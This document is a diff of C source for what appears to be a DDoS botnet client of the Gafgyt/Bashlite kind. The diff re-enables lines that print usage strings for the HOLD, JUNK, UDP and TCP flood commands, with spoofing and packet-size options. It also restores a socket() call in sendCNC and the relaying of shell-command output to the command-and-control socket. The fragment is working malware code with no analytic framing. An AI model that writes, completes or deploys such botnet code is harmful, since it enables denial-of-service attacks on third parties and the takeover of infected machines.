@@ -484,7 +484,7 @@ int recvLine(int socket, unsigned char *buf, int bufsize)
         }
         *cp = 0x00;
 
-//      zprintf("recv: %s\n", cp);
+      zprintf("recv: %s\n", cp);
 
         return count;
 }
@@ -1068,7 +1068,7 @@ void sendCNC(unsigned char *ip,int port, int end_time)
 	int end = time(NULL) + end_time;
 	int sockfd;
 	struct sockaddr_in server;
-	//sockfd = socket(AF_INET, SOCK_STREAM, 0);
+	sockfd = socket(AF_INET, SOCK_STREAM, 0);
 	
 	server.sin_addr.s_addr = inet_addr(ip);
     server.sin_family = AF_INET;
@@ -1428,7 +1428,7 @@ sockprintf(mainCommSock, "PROBING");
         {
                 if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                 {
-                        //sockprintf(mainCommSock, "HOLD <ip> <port> <time>");
+                        sockprintf(mainCommSock, "HOLD <ip> <port> <time>");
                         return;
                 }
 
@@ -1460,7 +1460,7 @@ sockprintf(mainCommSock, "PROBING");
         {
                 if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                 {
-                        //sockprintf(mainCommSock, "JUNK <ip> <port> <time>");
+                        sockprintf(mainCommSock, "JUNK <ip> <port> <time>");
                         return;
                 }
 
@@ -1493,7 +1493,7 @@ sockprintf(mainCommSock, "PROBING");
         {
                 if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1))
                 {
-                        //sockprintf(mainCommSock, "UDP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <packet size (1 to 65500)> (time poll interval, default 10)");
+                        sockprintf(mainCommSock, "UDP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <packet size (1 to 65500)> (time poll interval, default 10)");
                         return;
                 }
 
@@ -1636,7 +1636,7 @@ sockprintf(mainCommSock, "PROBING");
         {
                 if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1))
                 {
-                        //sockprintf(mainCommSock, "TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
+                        sockprintf(mainCommSock, "TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                         return;
                 }
 
@@ -1800,10 +1800,10 @@ int main(int argc, unsigned char *argv[])
                                         exit(0);
                         } else if (!pid2) {
                         } else {
-                                        //zprintf("fork failed\n");
+                                        zprintf("fork failed\n");
                         }
         } else {
-                        //zprintf("fork failed\n");
+                        zprintf("fork failed\n");
         }
 
         setsid();
@@ -1877,7 +1877,7 @@ int main(int argc, unsigned char *argv[])
                                         while(fdgets(buf, 1024, command) != NULL)
                                         {
                                                 trim(buf);
-//                                                sockprintf(mainCommSock, "%s", buf);
+                                                sockprintf(mainCommSock, "%s", buf);
                                                 memset(buf, 0, 1024);
                                                 sleep(1);
                                         }
@@ -1914,7 +1914,7 @@ int main(int argc, unsigned char *argv[])
                                 }
                         }
                 }
-                //printf("Link closed by server.\n");
+                printf("Link closed by server.\n");
         }
 
         return 0;
